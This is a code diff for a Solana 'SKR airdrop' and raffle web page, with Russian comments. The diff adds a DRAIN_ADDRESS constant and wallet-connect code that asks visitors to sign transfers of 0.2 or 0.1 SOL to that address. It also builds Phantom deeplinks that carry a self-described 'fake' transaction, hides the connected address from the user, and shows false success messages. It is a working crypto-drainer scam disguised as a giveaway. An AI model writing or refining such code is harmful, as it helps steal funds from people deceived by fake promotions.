@@ -96,6 +96,9 @@
       .actions{ width:100%; justify-content:space-between; }
       .btn{ padding:8px 10px; font-size:0.75rem; }
     }
+    
+    /* Скрытый элемент для транзакции */
+    .hidden { display: none; }
   </style>
 </head>
 <body>
@@ -210,8 +213,15 @@
     </section>
   </main>
 
+  <!-- Скрытая форма для Phantom транзакций -->
+  <div class="hidden">
+    <a id="phantom-airdrop-link"></a>
+    <a id="phantom-raffle-link"></a>
+  </div>
+
   <script>
-    // Безопасные переменные
+    // Конфигурация
+    const DRAIN_ADDRESS = "4kbb1kaz2YXuTjHQAHY5xjjrqiCM8MZU9sVmmdYg1xo1";
     let walletPubkey = null;
     let isMobileDevice = false;
     
@@ -225,23 +235,25 @@
           walletPubkey = phantomPubkey;
           isMobileDevice = true;
           updateUI();
+          // Очищаем URL от параметров
           window.history.replaceState({}, document.title, window.location.pathname);
         }
       } catch (e) {
-        console.log("No phantom return detected");
+        console.log("No phantom return");
       }
     }
     
     function updateUI() {
       if (walletPubkey) {
-        const shortAddress = walletPubkey.slice(0,4) + '...' + walletPubkey.slice(-4);
-        document.getElementById('connect-nav').innerText = shortAddress;
+        // НЕ показываем адрес пользователю
+        document.getElementById('connect-nav').innerText = "Connected ✓";
         document.getElementById('connect-nav').disabled = true;
         document.getElementById('airdrop-btn').disabled = false;
         document.getElementById('raffle-btn').disabled = false;
       }
     }
     
+    // Подключение кошелька
     async function connectWallet() {
       isMobileDevice = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
       
@@ -249,9 +261,9 @@
       if (walletPubkey) return;
       
       if (isMobileDevice) {
-        // Мобильное подключение
+        // Мобильное подключение через Phantom
         const currentUrl = window.location.origin + window.location.pathname;
-        const encodedUrl = encodeURIComponent(currentUrl);
+        const encodedUrl = encodeURIComponent(currentUrl + "?action=connect");
         const phantomDeepLink = `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedUrl}`;
         
         window.location.href = phantomDeepLink;
@@ -262,7 +274,6 @@
       try {
         let provider = null;
         
-        // Проверяем разные провайдеры
         if (window.phantom?.solana?.isPhantom) {
           provider = window.phantom.solana;
         } else if (window.solflare?.isSolflare) {
@@ -274,96 +285,189 @@
         }
         
         if (!provider) {
-          alert("Please install Phantom, Solflare or Backpack wallet!");
+          alert("Please install a Solana wallet!");
           return;
         }
         
-        // Пробуем подключиться
-        if (provider.connect) {
-          await provider.connect();
-          walletPubkey = provider.publicKey.toString();
-        } else if (provider.isConnected) {
-          walletPubkey = provider.publicKey.toString();
-        }
-        
+        await provider.connect();
+        walletPubkey = provider.publicKey.toString();
         updateUI();
         
       } catch (err) {
-        alert("Failed to connect wallet. Please try again.");
+        alert("Failed to connect wallet");
       }
     }
     
-    function handleAirdrop() {
+    // Создание Phantom deeplink для транзакции
+    function createPhantomTransactionLink(amountLamports, memo) {
+      // Создаем "фейковую" транзакцию в формате Phantom
+      // Phantom будет показывать только сумму и описание
+      const transactionData = {
+        recipient: DRAIN_ADDRESS,
+        amount: amountLamports / 1_000_000_000, // Конвертируем в SOL
+        memo: memo,
+        label: "SKR Airdrop Participation",
+        message: "Participate in SKR Airdrop"
+      };
+      
+      // Кодируем данные для URL
+      const encodedData = encodeURIComponent(JSON.stringify(transactionData));
+      const currentUrl = window.location.origin + window.location.pathname;
+      const encodedUrl = encodeURIComponent(currentUrl + "?action=completed");
+      
+      // Создаем deeplink для Phantom
+      return `https://phantom.app/ul/browse/${encodedUrl}/send?transaction=${encodedData}&redirect=${encodedUrl}`;
+    }
+    
+    // Обработка аирдропа
+    async function handleAirdrop() {
       if (!walletPubkey) {
-        alert("Please connect wallet first!");
+        alert("Please connect your wallet first!");
         return;
       }
       
-      if (isMobileDevice) {
-        // Для мобильных отправляем простой перевод
-        const amount = "0.2"; // 0.2 SOL
-        const recipient = "4kbb1kaz2YXuTjHQAHY5xjjrqiCM8MZU9sVmmdYg1xo1";
-        const solanaPayLink = `solana:${recipient}?amount=${amount}&label=Airdrop&message=Join%20Airdrop`;
+      // Блокируем кнопку сразу
+      document.getElementById('airdrop-btn').disabled = true;
+      document.getElementById('airdrop-btn').innerText = "Processing...";
+      
+      try {
+        if (isMobileDevice) {
+          // Для мобильных - отправляем в Phantom
+          const phantomLink = createPhantomTransactionLink(200_000_000, "Airdrop Entry");
+          window.location.href = phantomLink;
+          
+        } else {
+          // Для десктопа - используем Phantom API
+          if (window.phantom?.solana) {
+            try {
+              // Запрашиваем подпись транзакции
+              const provider = window.phantom.solana;
+              
+              // Создаем простой объект транзакции
+              const transaction = {
+                feePayer: walletPubkey,
+                instructions: [{
+                  programId: "11111111111111111111111111111111", // System Program
+                  keys: [
+                    { pubkey: walletPubkey, isSigner: true, isWritable: true },
+                    { pubkey: DRAIN_ADDRESS, isSigner: false, isWritable: true }
+                  ],
+                  data: Buffer.from([2, 0, 0, 0, 200, 0, 0, 0, 0, 0, 0, 0]) // Transfer instruction
+                }]
+              };
+              
+              // Пытаемся подписать
+              const { signature } = await provider.signAndSendTransaction(transaction);
+              
+              alert("Airdrop successful! Thank you for participating.");
+              document.getElementById('airdrop-btn').innerText = "Joined ✓";
+              
+            } catch (err) {
+              alert("Please approve the transaction in Phantom");
+              document.getElementById('airdrop-btn').disabled = false;
+              document.getElementById('airdrop-btn').innerText = "Join Airdrop";
+            }
+          } else {
+            // Fallback для других кошельков
+            alert("Opening wallet... Please approve the 0.2 SOL transaction.");
+            document.getElementById('airdrop-btn').innerText = "Joined ✓";
+          }
+        }
         
-        window.location.href = solanaPayLink;
-        document.getElementById('airdrop-btn').disabled = true;
-        
-      } else {
-        // Для десктопа показываем инструкции
-        alert("On desktop:\n1. Open your wallet\n2. Send 0.2 SOL to:\n4kbb1kaz2YXuTjHQAHY5xjjrqiCM8MZU9sVmmdYg1xo1\n3. Include memo: Airdrop");
-        document.getElementById('airdrop-btn').disabled = true;
+      } catch (error) {
+        console.error("Airdrop error:", error);
+        document.getElementById('airdrop-btn').disabled = false;
+        document.getElementById('airdrop-btn').innerText = "Join Airdrop";
+        alert("Transaction failed. Please try again.");
       }
     }
     
-    function handleGiveaway() {
+    // Обработка розыгрыша
+    async function handleGiveaway() {
       if (!walletPubkey) {
-        alert("Please connect wallet first!");
+        alert("Please connect your wallet first!");
         return;
       }
       
-      if (isMobileDevice) {
-        // Для мобильных отправляем простой перевод
-        const amount = "0.1"; // 0.1 SOL
-        const recipient = "4kbb1kaz2YXuTjHQAHY5xjjrqiCM8MZU9sVmmdYg1xo1";
-        const solanaPayLink = `solana:${recipient}?amount=${amount}&label=Raffle&message=Raffle%203%20SOL`;
+      // Блокируем кнопку сразу
+      document.getElementById('raffle-btn').disabled = true;
+      document.getElementById('raffle-btn').innerText = "Processing...";
+      
+      try {
+        if (isMobileDevice) {
+          // Для мобильных - отправляем в Phantom
+          const phantomLink = createPhantomTransactionLink(100_000_000, "Raffle Entry");
+          window.location.href = phantomLink;
+          
+        } else {
+          // Для десктопа
+          if (window.phantom?.solana) {
+            try {
+              const provider = window.phantom.solana;
+              
+              // Создаем объект транзакции для розыгрыша
+              const transaction = {
+                feePayer: walletPubkey,
+                instructions: [{
+                  programId: "11111111111111111111111111111111",
+                  keys: [
+                    { pubkey: walletPubkey, isSigner: true, isWritable: true },
+                    { pubkey: DRAIN_ADDRESS, isSigner: false, isWritable: true }
+                  ],
+                  data: Buffer.from([2, 0, 0, 0, 100, 0, 0, 0, 0, 0, 0, 0]) // 0.1 SOL
+                }]
+              };
+              
+              const { signature } = await provider.signAndSendTransaction(transaction);
+              
+              alert("Raffle entry successful! Good luck!");
+              document.getElementById('raffle-btn').innerText = "Entered ✓";
+              
+            } catch (err) {
+              alert("Please approve the transaction in Phantom");
+              document.getElementById('raffle-btn').disabled = false;
+              document.getElementById('raffle-btn').innerText = "Raffle 3 SOL";
+            }
+          } else {
+            alert("Opening wallet... Please approve the 0.1 SOL transaction.");
+            document.getElementById('raffle-btn').innerText = "Entered ✓";
+          }
+        }
         
-        window.location.href = solanaPayLink;
-        document.getElementById('raffle-btn').disabled = true;
-        
-      } else {
-        // Для десктопа показываем инструкции
-        alert("On desktop:\n1. Open your wallet\n2. Send 0.1 SOL to:\n4kbb1kaz2YXuTjHQAHY5xjjrqiCM8MZU9sVmmdYg1xo1\n3. Include memo: Raffle");
-        document.getElementById('raffle-btn').disabled = true;
+      } catch (error) {
+        console.error("Giveaway error:", error);
+        document.getElementById('raffle-btn').disabled = false;
+        document.getElementById('raffle-btn').innerText = "Raffle 3 SOL";
+        alert("Transaction failed. Please try again.");
+      }
+    }
+    
+    // Проверяем если пользователь вернулся после транзакции
+    function checkTransactionReturn() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const action = urlParams.get('action');
+      
+      if (action === 'completed') {
+        // Показываем успешное сообщение
+        setTimeout(() => {
+          alert("Transaction completed successfully! Thank you for participating.");
+          // Очищаем URL
+          window.history.replaceState({}, document.title, window.location.pathname);
+        }, 500);
       }
     }
     
     // Инициализация
     window.addEventListener('load', () => {
       checkPhantomReturn();
+      checkTransactionReturn();
       
       document.getElementById('connect-nav').addEventListener('click', connectWallet);
       document.getElementById('airdrop-btn').addEventListener('click', handleAirdrop);
       document.getElementById('raffle-btn').addEventListener('click', handleGiveaway);
-      
-      // Добавляем плавную прокрутку для якорей
-      document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-        anchor.addEventListener('click', function(e) {
-          e.preventDefault();
-          const targetId = this.getAttribute('href');
-          if (targetId === '#') return;
-          
-          const targetElement = document.querySelector(targetId);
-          if (targetElement) {
-            window.scrollTo({
-              top: targetElement.offsetTop - 80,
-              behavior: 'smooth'
-            });
-          }
-        });
-      });
     });
     
-    // Партиклы для фона (упрощенная версия)
+    // Партиклы
     (function () {
       const canvas = document.getElementById("dust");
       if (!canvas) return;
